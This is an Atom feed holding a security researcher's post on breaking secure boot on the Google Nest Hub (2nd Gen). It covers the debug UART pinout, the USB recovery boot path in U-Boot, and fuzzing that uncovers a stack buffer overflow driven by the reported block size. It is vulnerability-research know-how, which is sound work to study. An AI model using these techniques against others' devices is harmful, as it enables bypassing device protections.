<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>fred's notes</title><link href="https://fredericb.info/" rel="alternate"></link><link href="https://fredericb.info/feeds/all.atom.xml" rel="self"></link><id>https://fredericb.info/</id><updated>2022-06-15T00:00:00-07:00</updated><subtitle>Security &amp; Stuff</subtitle><entry><title>Breaking Secure Boot on Google Nest Hub (2nd Gen) to run Ubuntu</title><link href="https://fredericb.info/2022/06/breaking-secure-boot-on-google-nest-hub-2nd-gen-to-run-ubuntu.html" rel="alternate"></link><published>2022-06-15T00:00:00-07:00</published><updated>2022-06-15T00:00:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2022-06-15:/2022/06/breaking-secure-boot-on-google-nest-hub-2nd-gen-to-run-ubuntu.html</id><summary type="html">&lt;p&gt;In this post, we attack the Nest Hub (2nd Gen), an always-connected smart home display from Google, in order to boot a custom OS.&lt;/p&gt;
&lt;p&gt;First, we explore both hardware and software attack surface in search of security vulnerabilities that could permit arbitrary code execution on the device.&lt;/p&gt;
&lt;p&gt;Then, using a …&lt;/p&gt;</summary><content type="html">&lt;p&gt;In this post, we attack the Nest Hub (2nd Gen), an always-connected smart home display from Google, in order to boot a custom OS.&lt;/p&gt;
&lt;p&gt;First, we explore both hardware and software attack surface in search of security vulnerabilities that could permit arbitrary code execution on the device.&lt;/p&gt;
&lt;p&gt;Then, using a &lt;a href="https://www.raspberrypi.com/products/raspberry-pi-pico/"&gt;Raspberry Pi Pico microcontroller&lt;/a&gt;, we exploit an USB bug in the bootloader to break the secure boot chain.&lt;/p&gt;
&lt;p&gt;Finally, we build new bootloader and kernel images to boot a custom OS from an external flash drive.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Booting Ubuntu on Google Nest Hub (2nd Gen) using CHIPICOPWN" src="https://fredericb.info/blog/elaine/chipicopwn.gif" style="display: block;margin-left: auto;margin-right: auto;"&gt;&lt;/p&gt;
&lt;h1&gt;Disclaimer&lt;/h1&gt;
&lt;p&gt;You are solely responsible for any damage caused to your hardware/software/keys/DRM licences/warranty/data/cat/etc...&lt;/p&gt;
&lt;h1&gt;1. Hardware exploration&lt;/h1&gt;
&lt;h2&gt;Virtual tour&lt;/h2&gt;
&lt;p&gt;Overviews of internal hardware published on &lt;a href="https://fccid.io/A4RGUIK2/Internal-Photos/Internal-Photos-20200702-v1-Internal-Photos-5035937"&gt;FFC ID website&lt;/a&gt; and &lt;a href="https://electronics360.globalspec.com/article/17053/teardown-google-nest-hub-2nd-gen"&gt;Electronics360&lt;/a&gt; indicate the device is based on Amlogic S905D3G SoC.&lt;/p&gt;
&lt;p&gt;&lt;img alt="External photo from FCC.IO" src="https://fredericb.info/blog/elaine/elaine.usb.port.png" style="display: block;margin-left: auto;margin-right: auto;" width="800px"&gt;&lt;/p&gt;
&lt;p&gt;They also reveal the existence of one USB port hidden underneath the device. Not a feature for users, so a priority for us. Especially since we already &lt;a href="https://fredericb.info/2021/02/amlogic-usbdl-unsigned-code-loader-for-amlogic-bootrom.html"&gt;discovered and exploited an USB vulnerability in the same chipset&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Good enough, let's buy one. The oldest one, always... Conveniently, manufacturing date is on box : December 2020.&lt;/p&gt;
&lt;h2&gt;Nice try but no&lt;/h2&gt;
&lt;p&gt;The first thing to check once we have the device in hands is if the &lt;a href="https://fredericb.info/2021/02/amlogic-usbdl-unsigned-code-loader-for-amlogic-bootrom.html"&gt;known USB vulnerability&lt;/a&gt; has been fixed. Doing so requires to boot the SoC in USB Download mode by holding a combination of buttons. After trying few random combinations, a new USB device is detected by our host, which indicates we found the right combination : Volume UP + Volume DOWN. We can then try to use the exploitation tool &lt;a href="https://github.com/frederic/amlogic-usbdl"&gt;amlogic-usbdl&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Unfortunately (for us), the tool detects that the device is password-protected, so we can't exploit this bug.&lt;/p&gt;
&lt;p&gt;However, while attempting to trigger USB Download mode, we noticed few other button combinations that prevent the device to fully boot (stuck on boot logo).
We keep that in mind since a boot flow change can also mean attack surface change.&lt;/p&gt;
&lt;h2&gt;Mysterious wires&lt;/h2&gt;
&lt;p&gt;After looking closely at the USB port, we notice that both USB and power supply connectors are on a separate module, which is connected to the main board via a 16-pin &lt;a href="https://en.wikipedia.org/wiki/Flexible_flat_cable"&gt;Flexible Flat Cable (FFC)&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="USB/DC board" src="https://fredericb.info/blog/elaine/elaine.USB-DC.board.png" style="display: block;margin-left: auto;margin-right: auto;" width="800px"&gt;&lt;/p&gt;
&lt;p&gt;That's a lot of wires for only one micro-USB 2.0 (5 pins) &amp;amp; one power supply (2 pins).&lt;/p&gt;
&lt;p&gt;Such flat cable, accessible without dissassembly and offering extra wires (apparently) unused, evokes a hidden cability to connect a &lt;em&gt;developer&lt;/em&gt; board with additionnal interfaces (UART ? JTAG ? SDCARD ?) for development or repair purposes.&lt;/p&gt;
&lt;p&gt;In order to uncover potential other interfaces, we first identify the pins associated with USB and power supply using a multimeter :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Power supply connector to FFC : 11 pins! ouch...&lt;/li&gt;
&lt;li&gt;USB connector to FFC : 3 pins (No USB +5V)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;With 14 pins identified, only 2 are left.&lt;/p&gt;
&lt;p&gt;The voltage measured on these 2 pins during boot is constant near-0V for the first one, and fluctuating between 0V and 3.3V for the second. This pattern matches an UART port.&lt;/p&gt;
&lt;p&gt;We now have the complete pinout of the flexible flat cable :&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;PIN&lt;/th&gt;
&lt;th&gt;FUNCTION&lt;/th&gt;
&lt;th&gt;PIN&lt;/th&gt;
&lt;th&gt;FUNCTION&lt;/th&gt;
&lt;th&gt;PIN&lt;/th&gt;
&lt;th&gt;FUNCTION&lt;/th&gt;
&lt;th&gt;PIN&lt;/th&gt;
&lt;th&gt;FUNCTION&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;GND&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;GND&lt;/td&gt;
&lt;td&gt;9&lt;/td&gt;
&lt;td&gt;VCC&lt;/td&gt;
&lt;td&gt;13&lt;/td&gt;
&lt;td&gt;USB-D-&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;GND&lt;/td&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;VCC&lt;/td&gt;
&lt;td&gt;10&lt;/td&gt;
&lt;td&gt;VCC&lt;/td&gt;
&lt;td&gt;14&lt;/td&gt;
&lt;td&gt;USB-D+&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;UART-TX&lt;/td&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;VCC&lt;/td&gt;
&lt;td&gt;11&lt;/td&gt;
&lt;td&gt;VCC&lt;/td&gt;
&lt;td&gt;15&lt;/td&gt;
&lt;td&gt;GND&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;UART-RX&lt;/td&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;VCC&lt;/td&gt;
&lt;td&gt;12&lt;/td&gt;
&lt;td&gt;GND&lt;/td&gt;
&lt;td&gt;16&lt;/td&gt;
&lt;td&gt;USB-ID&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;DIY debug board&lt;/h2&gt;
&lt;p&gt;We take advantage of the accessible FFC to connect a breakout board with the right FCC connector : 16-pin, 0.5mm pitch.&lt;/p&gt;
&lt;p&gt;Several options exist:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Presoldered &lt;a href="https://www.aliexpress.com/item/32923333053.html"&gt;16-pin 0.5mm FFC board&lt;/a&gt; : hard to find except in China.&lt;/li&gt;
&lt;li&gt;Presoldered 0.5mm FFC board with more pins (i.e &lt;a href="https://smile.amazon.com/gp/product/B07RWMSVNH"&gt;24-pin&lt;/a&gt;) : very dangerous if connections are shifted.&lt;/li&gt;
&lt;li&gt;Solder the &lt;a href="https://www.digikey.com/en/products/detail/molex/0528921633/4444660"&gt;right connector&lt;/a&gt; on a &lt;a href="https://tinkersphere.com/cables-wires/3643-16-pin-05mm-1mm-pitch-fpc-to-dip-breakout.html"&gt;breakout board&lt;/a&gt; : the solution we opted for.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="16 Pin 0.5mm &amp;amp; 1mm pitch FPC to DIP Breakout" src="https://fredericb.info/blog/elaine/board.FPC.16P_0.5mm.png" style="display: block;margin-left: auto;margin-right: auto;" width="800px"&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="DIY debug board for Google Nest Hub" src="https://fredericb.info/blog/elaine/elaine.debug.board.png" style="display: block;margin-left: auto;margin-right: auto;" width="800px"&gt;&lt;/p&gt;
&lt;p&gt;This board provides a convenient access to UART, USB and power supply.&lt;/p&gt;
&lt;h2&gt;UART port&lt;/h2&gt;
&lt;p&gt;Using our debug board, we connect an USB-to-Serial adapter to the UART port to obtain logs during boot :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SM1:BL:511f6b:81ca2f&lt;span class="p"&gt;;&lt;/span&gt;FEAT:A28821B2:202B3000&lt;span class="p"&gt;;&lt;/span&gt;POC:F&lt;span class="p"&gt;;&lt;/span&gt;EMMC:0&lt;span class="p"&gt;;&lt;/span&gt;READ:0&lt;span class="p"&gt;;&lt;/span&gt;CHK:1F&lt;span class="p"&gt;;&lt;/span&gt;READ:0&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.0&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.0&lt;span class="p"&gt;;&lt;/span&gt;CHK:0&lt;span class="p"&gt;;&lt;/span&gt;
bl2_stage_init 0x01
&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
BL2 Built : &lt;span class="m"&gt;20&lt;/span&gt;:46:51, Dec &lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt;. &lt;span class="se"&gt;\n&lt;/span&gt;g12a g3d61890 - user@host
&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
U-Boot &lt;span class="m"&gt;2019&lt;/span&gt;.01-gbfc19012ea-dirty &lt;span class="o"&gt;(&lt;/span&gt;Dec &lt;span class="m"&gt;11&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; - &lt;span class="m"&gt;04&lt;/span&gt;:19:32 &lt;span class="o"&gt;)&lt;/span&gt;

DRAM:  &lt;span class="m"&gt;2&lt;/span&gt; GiB
board init
&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
MUTE engaged
VOL_UP not pressed
upgrade key not pressed
reboot_mode:cold_boot
cold_boot
aml log : boot from nand or emmc
Kernel decrypted
kernel verify: success
&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
Starting kernel ...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can see bootloader and U-Boot logs, kernel image seems encrypted, but 
no more logs once Linux has started though.&lt;/p&gt;
&lt;p&gt;We also see that button states are checked ("MUTE engaged", "VOL_UP not pressed"), and that "upgrade key not pressed".
This is really intriguing since any new feature we discover could represent a new attack surface.&lt;/p&gt;
&lt;p&gt;We try to boot again, this time while holding both volume buttons (volume down &amp;amp; volume up) :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
U-Boot &lt;span class="m"&gt;2019&lt;/span&gt;.01-gbfc19012ea-dirty &lt;span class="o"&gt;(&lt;/span&gt;Dec &lt;span class="m"&gt;11&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; - &lt;span class="m"&gt;04&lt;/span&gt;:19:32 &lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
MUTE engaged
VOL_UP pressed
VOL_DN pressed
detect VOL_UP pressed
VOL_DN pressed
resetting USB...
USB0:   Register &lt;span class="m"&gt;3000140&lt;/span&gt; NbrPorts &lt;span class="m"&gt;2&lt;/span&gt;
Starting the controller
USB XHCI &lt;span class="m"&gt;1&lt;/span&gt;.10
scanning bus &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; devices... &lt;span class="m"&gt;3&lt;/span&gt; USB Device&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt; found
       scanning usb &lt;span class="k"&gt;for&lt;/span&gt; storage devices... &lt;span class="m"&gt;2&lt;/span&gt; Storage Device&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt; found
** Unable to &lt;span class="nb"&gt;read&lt;/span&gt; file recovery.img **
resetting USB...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;When booted this way, the Nest Hub tries to load a file named &lt;em&gt;recovery.img&lt;/em&gt; from an USB flash drive. Attack surface just increased.&lt;/p&gt;
&lt;h1&gt;2. Software exploration&lt;/h1&gt;
&lt;p&gt;While official firmware images for Nest Hub are not publicly available, the &lt;a href="https://drive.google.com/file/d/1euEvmbInWddUFAhMhHe628WAnpdYpGIa/view?usp=sharing"&gt;source code for the bootloader (U-Boot) and the kernel (Linux) has been released by Google&lt;/a&gt; thanks to the GPL license.&lt;/p&gt;
&lt;h2&gt;Mysterious USB recovery feature&lt;/h2&gt;
&lt;p&gt;We start by investigating the recovery mechanism we spotted earlier as it happens to be interesting for several reasons:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Implemented in U-Boot so open source : easy to study.&lt;/li&gt;
&lt;li&gt;Apparently meant to run a recovery boot image : exactly what we want to achieve, but is it signed ?&lt;/li&gt;
&lt;li&gt;A lot of code involved : USB, Mass Storage device, partition table, filesystem, boot image parsing, boot image signature verification (if any). Bugs in these layers could lead to arbitrary code execution.&lt;/li&gt;
&lt;li&gt;Data is loaded from external USB source : no need to disassemble the device.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To quickly locate this feature in U-Boot source tree, we grep &lt;em&gt;recovery.img&lt;/em&gt;. We find a function named &lt;strong&gt;recovery_from_udisk&lt;/strong&gt; in U-Boot environment :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;recovery_from_udisk=&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
       &lt;span class="s2"&gt;&amp;quot;while true ;do &amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
              &lt;span class="s2"&gt;&amp;quot;usb reset; &amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
              &lt;span class="s2"&gt;&amp;quot;if fatload usb 0 &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;loadaddr&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; recovery.img; then &amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
                     &lt;span class="s2"&gt;&amp;quot;bootm &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;loadaddr&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;;&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
              &lt;span class="s2"&gt;&amp;quot;fi;&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
       &lt;span class="s2"&gt;&amp;quot;done;&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
       &lt;span class="s2"&gt;&amp;quot;\0&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;First, this code resets the USB subsystem. Then, it calls the &lt;strong&gt;fatload&lt;/strong&gt; function to load a boot image named &lt;em&gt;recovery.img&lt;/em&gt; in memory at address &lt;em&gt;loadaddr&lt;/em&gt;.
Finally, it tries to boot the loaded data using function &lt;strong&gt;bootm&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;We can also confirm that function &lt;strong&gt;recovery_from_udisk&lt;/strong&gt; is run when both volume buttons are held  (GPIOZ_5 &amp;amp; GPIOZ_6) :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;upgrade_key=&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
       &lt;span class="s2"&gt;&amp;quot;if gpio input GPIOZ_5; then &amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
              &lt;span class="s2"&gt;&amp;quot;echo detect VOL_UP pressed;&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
              &lt;span class="s2"&gt;&amp;quot;if gpio input GPIOZ_6; then &amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
                     &lt;span class="s2"&gt;&amp;quot;echo VOL_DN pressed;&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
                     &lt;span class="s2"&gt;&amp;quot;setenv boot_external_image 1;&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
                     &lt;span class="s2"&gt;&amp;quot;run recovery_from_udisk;&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This recovery feature is an ideal mechanism to boot an alternative OS. However, a quick look at &lt;strong&gt;bootm&lt;/strong&gt; function reveals it systematically verifies &lt;em&gt;recovery.img&lt;/em&gt; signature by calling function &lt;strong&gt;aml_sec_boot_check&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;To boot a custom OS using this mechanism, we first have to find a bug that could bypass this verification.&lt;/p&gt;
&lt;h2&gt;Bug hunt&lt;/h2&gt;
&lt;p&gt;The recovery feature enables USB interface as an attack vector.
As a result, any code that processes data coming from USB interface becomes a potential (software) attack surface.&lt;/p&gt;
&lt;p&gt;This attack surface can be roughly estimated by exploring the call flow triggered by the recovery feature :&lt;/p&gt;
&lt;p&gt;&lt;img alt="USB Mass Sstorage attack surface in U-Boot" src="https://fredericb.info/blog/elaine/uboot-cfg.png" style="display: block;margin-left: auto;margin-right: auto;" width="600px"&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;usb reset&lt;/strong&gt; exposes the USB driver when it performs USB enumeration.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;fatload&lt;/strong&gt; exposes several drivers : USB, Mass Storage, DOS partition, FAT filesystem.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;bootm&lt;/strong&gt; attack surface is very limited since it starts by calling the signature verification routine &lt;strong&gt;aml_sec_boot_check&lt;/strong&gt;, which cannot be reviewed because it's implemented in TrustZone (no source code or binary available at this moment).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The attack surface exposed by &lt;strong&gt;fatload&lt;/strong&gt; command is obviously the most interesting target due to the amount of code involved and its complexity.&lt;/p&gt;
&lt;p&gt;While &lt;a href="https://forallsecure.com/blog/forallsecure-uncovers-critical-vulnerabilities-in-das-u-boot"&gt;previous research&lt;/a&gt; found issues in &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13103"&gt;DOS partition parser&lt;/a&gt; and &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13104"&gt;EXT4&lt;/a&gt; &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13105"&gt;filesystem&lt;/a&gt; &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13106"&gt;parser&lt;/a&gt;, we could not find public evidence of vulnerabilty research on U-Boot FAT filesystem, which makes it an ideal target to begin with.&lt;/p&gt;
&lt;p&gt;U-Boot implements a &lt;em&gt;sandbox&lt;/em&gt; architecture that allows it to run as a Linux user-space application. This feature is a convenient starting point to build a fuzzer for U-Boot code.&lt;/p&gt;
&lt;p&gt;We build a fuzzing harness that injects data in &lt;strong&gt;blk_dread&lt;/strong&gt; (function that reads data from a block device), and triggers execution by calling &lt;strong&gt;fat_read_file&lt;/strong&gt;. The harness must also initialize the state that is expected by these functions : USB enumeration done, block device detected, partitions have been parsed (in real conditions, this initialization would have been performed by &lt;strong&gt;fs_set_blk_dev&lt;/strong&gt;). Fuzzing is performed by &lt;a href="https://github.com/google/AFL"&gt;AFL&lt;/a&gt; and &lt;a href="https://llvm.org/docs/LibFuzzer.html"&gt;libFuzzer&lt;/a&gt;.
This first fuzzing attempt uncovered few &lt;a href="https://en.wikipedia.org/wiki/Circular_reference"&gt;circular reference&lt;/a&gt; issues in FAT cluster chains that caused the code to loop indefinitely. While being painful to fix, they're not the kind of bugs we're looking for.&lt;/p&gt;
&lt;p&gt;In a second phase, we extend the fuzzing to the initialized state since some parameters can be controlled by the attacker. For example, the USB Mass Storage driver sets &lt;a href="https://github.com/u-boot/u-boot/blob/28c2ebef372b4c9bb18bed8373e0d9e65a09b42b/common/usb_storage.c#L1421"&gt;multiple parameters&lt;/a&gt; in &lt;a href="https://github.com/u-boot/u-boot/blob/28c2ebef372b4c9bb18bed8373e0d9e65a09b42b/include/blk.h#L67"&gt;structure blk_desc&lt;/a&gt; that describe the detected block device in initialized state.&lt;/p&gt;
&lt;p&gt;One of them is the block size (&lt;em&gt;blk_desc.blksz&lt;/em&gt;) of the block device (which is an USB flash drive in our case). This value is obtained from the block device by sending command &lt;a href="https://github.com/u-boot/u-boot/blob/28c2ebef372b4c9bb18bed8373e0d9e65a09b42b/common/usb_storage.c#L1051"&gt;READ CAPACITY&lt;/a&gt;, which means attacker controls it.&lt;/p&gt;
&lt;p&gt;Block size is an important parameter for upper layers like partition and filesystem drivers. Messing with it led to an interesting crash :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;fuzz&lt;/span&gt;
&lt;span class="nl"&gt;INFO&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nl"&gt;Seed&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;473398954&lt;/span&gt;
&lt;span class="nl"&gt;INFO&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Loaded&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;modules&lt;/span&gt;   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1402&lt;/span&gt; &lt;span class="kr"&gt;inline&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;bit&lt;/span&gt; &lt;span class="n"&gt;counters&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1402&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x5aa0c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x5aa63a&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; 
&lt;span class="nl"&gt;INFO&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Loaded&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;PC&lt;/span&gt; &lt;span class="n"&gt;tables&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1402&lt;/span&gt; &lt;span class="n"&gt;PCs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1402&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x57ada0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x580540&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; 
&lt;span class="o"&gt;=================================================================&lt;/span&gt;
&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;5892&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="nl"&gt;ERROR&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nl"&gt;AddressSanitizer&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;stack&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;overflow&lt;/span&gt; &lt;span class="n"&gt;on&lt;/span&gt; &lt;span class="n"&gt;address&lt;/span&gt; &lt;span class="mh"&gt;0x7ffe6db4bb3f&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="n"&gt;pc&lt;/span&gt; &lt;span class="mh"&gt;0x0000004f16af&lt;/span&gt; &lt;span class="n"&gt;bp&lt;/span&gt; &lt;span class="mh"&gt;0x7ffe6db4b790&lt;/span&gt; &lt;span class="n"&gt;sp&lt;/span&gt; &lt;span class="mh"&gt;0x7ffe6db4af40&lt;/span&gt;
&lt;span class="n"&gt;WRITE&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="mi"&gt;32768&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0x7ffe6db4bb3f&lt;/span&gt; &lt;span class="kr"&gt;thread&lt;/span&gt; &lt;span class="n"&gt;T0&lt;/span&gt;
    &lt;span class="cp"&gt;#0 0x4f16ae in __asan_memset (/u-boot-elaine/fuzzer/fuzz+0x4f16ae)&lt;/span&gt;
    &lt;span class="cp"&gt;#1 0x55a8cf in blk_dread /u-boot-elaine/fuzzer/blk.c:153:13&lt;/span&gt;
    &lt;span class="cp"&gt;#2 0x5284b1 in part_test_dos /u-boot-elaine/disk/part_dos.c:96:6&lt;/span&gt;
    &lt;span class="cp"&gt;#3 0x521f52 in part_init /u-boot-elaine/disk/part.c:242:9&lt;/span&gt;
    &lt;span class="cp"&gt;#4 0x55b494 in usb_stor_probe_device /u-boot-elaine/fuzzer/usb_storage.c:41:5&lt;/span&gt;
    &lt;span class="cp"&gt;#5 0x55b648 in LLVMFuzzerTestOneInput /u-boot-elaine/fuzzer/fuzz.c:42:5&lt;/span&gt;
    &lt;span class="cp"&gt;#6 0x42ee1a in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/u-boot-elaine/fuzzer/fuzz+0x42ee1a)&lt;/span&gt;
    &lt;span class="cp"&gt;#7 0x43052a in fuzzer::Fuzzer::ReadAndExecuteSeedCorpora(std::vector&amp;lt;std::__cxx11::basic_string&amp;lt;char, std::char_traits&amp;lt;char&amp;gt;, std::allocator&amp;lt;char&amp;gt; &amp;gt;, fuzzer::fuzzer_allocator&amp;lt;std::__cxx11::basic_string&amp;lt;char, std::char_traits&amp;lt;char&amp;gt;, std::allocator&amp;lt;char&amp;gt; &amp;gt; &amp;gt; &amp;gt; const&amp;amp;) (/u-boot-elaine/fuzzer/fuzz+0x43052a)&lt;/span&gt;
    &lt;span class="cp"&gt;#8 0x430bf5 in fuzzer::Fuzzer::Loop(std::vector&amp;lt;std::__cxx11::basic_string&amp;lt;char, std::char_traits&amp;lt;char&amp;gt;, std::allocator&amp;lt;char&amp;gt; &amp;gt;, fuzzer::fuzzer_allocator&amp;lt;std::__cxx11::basic_string&amp;lt;char, std::char_traits&amp;lt;char&amp;gt;, std::allocator&amp;lt;char&amp;gt; &amp;gt; &amp;gt; &amp;gt; const&amp;amp;) (/u-boot-elaine/fuzzer/fuzz+0x430bf5)&lt;/span&gt;
    &lt;span class="cp"&gt;#9 0x426e00 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/u-boot-elaine/fuzzer/fuzz+0x426e00)&lt;/span&gt;
    &lt;span class="cp"&gt;#10 0x44a412 in main (/u-boot-elaine/fuzzer/fuzz+0x44a412)&lt;/span&gt;
    &lt;span class="cp"&gt;#11 0x7b733912f09a in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2409a)&lt;/span&gt;
